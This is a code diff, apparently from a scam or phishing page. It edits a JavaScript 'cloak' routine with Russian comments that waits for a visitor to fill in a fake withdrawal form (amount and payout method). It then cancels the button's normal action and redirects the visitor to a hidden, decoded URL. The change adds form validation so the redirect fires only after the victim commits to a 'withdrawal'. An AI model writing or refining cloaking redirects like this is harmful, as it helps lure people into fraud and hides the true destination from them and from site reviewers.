@@ -553,16 +553,31 @@
   try {
   const u = new URL(decoded);
 
-  // Ждем нажатие кнопки "Вывести"
+  // Находим элементы формы
   const withdrawBtn = document.querySelector('.withdraw-btn') || document.querySelector('#withdraw') || document.querySelector('button');
+  const amountInput = document.querySelector('#amount') || document.querySelector('input[name="amount"]');
+  const methodSelect = document.querySelector('#method') || document.querySelector('select[name="method"]');
 
   if (withdrawBtn) {
-    console.log('[CLOAK] ждём нажатия на кнопку для перехода...');
+    console.log('[CLOAK] Ждём заполнения формы и нажатия кнопки...');
+
     withdrawBtn.addEventListener('click', (e) => {
       e.preventDefault();
-      console.log('[CLOAK] переход по клику на кнопку ->', decoded);
+
+      // Проверяем, выбрана ли сумма и способ
+      const amount = amountInput ? amountInput.value.trim() : null;
+      const method = methodSelect ? methodSelect.value.trim() : null;
+
+      if (!amount || !method) {
+        alert('Выберите сумму и способ вывода!');
+        console.warn('[CLOAK] Не выбраны сумма или способ, редирект отменён.');
+        return;
+      }
+
+      console.log('[CLOAK] Всё заполнено, выполняем переход ->', decoded);
       window.location.href = decoded;
     });
+
   } else {
     console.warn("[CLOAK] Кнопка 'Вывести' не найдена, переход не выполнен");
   }
